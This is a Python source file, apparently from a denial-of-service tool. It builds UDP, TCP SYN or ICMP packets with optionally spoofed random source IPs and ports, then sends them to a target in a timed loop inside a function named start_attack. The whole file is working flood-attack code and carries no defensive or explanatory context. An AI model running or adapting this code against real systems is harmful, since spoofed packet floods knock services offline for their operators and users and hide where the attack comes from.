from random import randint
from time import time, sleep

from enum import Enum
from packets import *


def get_random_ip():
    return "%i.%i.%i.%i" % (randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))


def get_random_port():
    return randint(1, 65535)


def get_random_data(data_length):
    return ''.join([str(randint(1, 254)) for i in xrange(data_length)])


class AttackType(Enum):
    UDP = 1
    TCP = 2
    ICMP = 3

    def __repr__(self):
        return "UDP" if self == AttackType.UDP else "TCP" if self == AttackType.TCP else "ICMP"


def get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port, source_ip, source_port,
               destination_ip, destination_port, data_length):
    sip = get_random_ip() if random_source_ip else source_ip
    sp = get_random_port() if random_source_port else source_port
    dp = get_random_port() if random_destination_port else destination_port
    return get_packet_func(srcIp=sip, dstIp=destination_ip, srcPort=sp, dstPort=dp, data=get_random_data(data_length))


def start_attack(type_attack, duration, interval, random_source_ip, random_source_port, random_destination_port,
                 source_ip, source_port, destination_ip, destination_port, data_length):
    used_random = random_source_ip or random_source_port or random_destination_port
    sock = getSocket()
    if type_attack == AttackType.UDP:
        get_packet_func = getUdpPacket
    elif type_attack == AttackType.TCP:
        get_packet_func = getTcpSynPacket
    else:
        get_packet_func = getIcmpPacket

    packet = get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port, source_ip,
                        source_port, destination_ip, destination_port, data_length)
    amount = duration
    end_time = time() + amount
    counter = 0
    while time() < end_time:
        sock.sendto(packet, (destination_ip, 0))
        counter += 1
        sleep(interval)
        if used_random:
            packet = get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port,
                                source_ip, source_port, destination_ip, destination_port, data_length)